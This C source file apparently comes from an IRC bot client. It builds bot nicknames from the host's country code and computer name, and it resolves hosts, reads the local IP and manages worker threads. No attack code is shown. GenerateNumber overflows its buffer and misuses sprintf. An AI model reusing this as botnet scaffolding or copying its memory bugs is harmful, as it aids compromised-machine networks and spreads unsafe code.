#include "includes.h"
#include "externs.h"


char *GenerateNumber(int Len)
{
	char *nick;
	int i;
	nick = (char *) malloc (Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand()%10);
	}
	nick[i] = '\0';
	return nick;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *GenerateNickA(void)
{
	static char nick[MAX_NICKLEN];
	ZeroMemory(nick,MAX_NICKLEN);
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
		strcat(nick,"{");
		strcat(nick,locale);
		strcat(nick,"|");
	static char name[NAMELEN];
	char endchar2[24] = "\0";
	ZeroMemory(name,NAMELEN);
	BOOL good2=FALSE;
	DWORD dwcb2=MAX_NICKLEN;
	GetComputerName(name,&dwcb2);
	for (int j=65;j<91;j++) { if (name[0] == j) good2=TRUE; }
	for (int k=97;k<123;k++) { if (name[0] == k) good2=TRUE; }
	strcat(name, endchar2);
	name[15] = '\0';
	strcat(nick,name);
    strcat(nick,"|");
	int i=1;
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
		strcat(nick,strbuf);
	}
	strcat(nick,"}");
	return nick;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

unsigned int Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = gethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *GetMyIP(SOCKET sock) 
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (ip);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void Thread_Prepare()
{
	int		i;
	
	for (i = 0; i < MAX_THREADS; i++)
	{
		threads[i].tHandle = NULL;
		threads[i].type = NONE;
	}
}

int Thread_Add(thread_type type)
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].tHandle == NULL)
			break;

	if (i == MAX_THREADS)
		i = -1;
	else
		threads[i].type = type;
		
	return i;
}

int Thread_Check(thread_type type)
{
	int		i, 
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].type == type)
			k++;

	return k;
}

void Thread_Clear(int num)
{
	threads[num].tHandle = NULL;
	threads[num].type = NONE;
	closesocket(threads[num].tsock);
}

int Thread_Kill(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].type == type)
		{
			TerminateThread(threads[i].tHandle, 0);
			Thread_Clear(i);
			k++;
		}
	}

	return k;
}

HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
	DWORD		id = 0;
	HANDLE		tHandle;

	tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

	if (wait)
	{
		WaitForSingleObject(tHandle, INFINITE);
		CloseHandle(tHandle);
	}
	else
		Sleep(THREAD_WAIT_TIME);

	return tHandle;
}



